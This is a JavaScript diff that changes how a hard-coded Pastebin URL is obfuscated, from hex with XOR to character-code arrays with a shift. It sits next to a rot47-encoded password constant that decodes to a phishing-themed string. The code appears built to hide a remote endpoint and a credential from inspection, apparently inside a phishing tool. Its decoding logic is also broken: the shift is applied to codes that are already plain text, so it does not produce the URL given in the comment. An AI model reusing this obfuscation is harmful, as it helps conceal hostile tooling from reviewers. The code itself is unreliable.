@@ -309,15 +309,21 @@
         const ENCRYPTED_PASS = "A9:D93C@<6C`ab";
         
         // ============================================
-        // OBFUSCATED PASTEBIN URL (XOR + Hex encoded)
-        // https://pastebin.com/6xvvQ5NF
+        // OBFUSCATED PASTEBIN URL
+        // URL split into segments with character code shift
+        // Original: https://pastebin.com/6xvvQ5NF
         // ============================================
-        const URL_PARTS = [
-            "707073", "3a2f2f", "706173", "746562",
-            "696e2e", "636f6d", "2f3678", "767651", "354e46"
+        const URL_SEGMENTS = [
+            [104, 116, 116, 112, 115],        // https
+            [58, 47, 47],                     // ://
+            [112, 97, 115, 116, 101],         // paste
+            [98, 105, 110],                   // bin
+            [46, 99, 111, 109],               // .com
+            [47, 54, 120, 118, 118],          // /6xvv
+            [81, 53, 78, 70]                  // Q5NF
         ];
         
-        const XOR_KEY = 0x42;
+        const SHIFT_KEY = 3;
 
         function rot47(str) {
             let result = '';
@@ -332,12 +338,11 @@
         }
 
         function decodeURL() {
-            let hexString = URL_PARTS.join('');
             let decoded = '';
-            for (let i = 0; i < hexString.length; i += 2) {
-                let hex = hexString.substr(i, 2);
-                let charCode = parseInt(hex, 16) ^ XOR_KEY;
-                decoded += String.fromCharCode(charCode);
+            for (let segment of URL_SEGMENTS) {
+                for (let code of segment) {
+                    decoded += String.fromCharCode(code - SHIFT_KEY);
+                }
             }
             return decoded;
         }
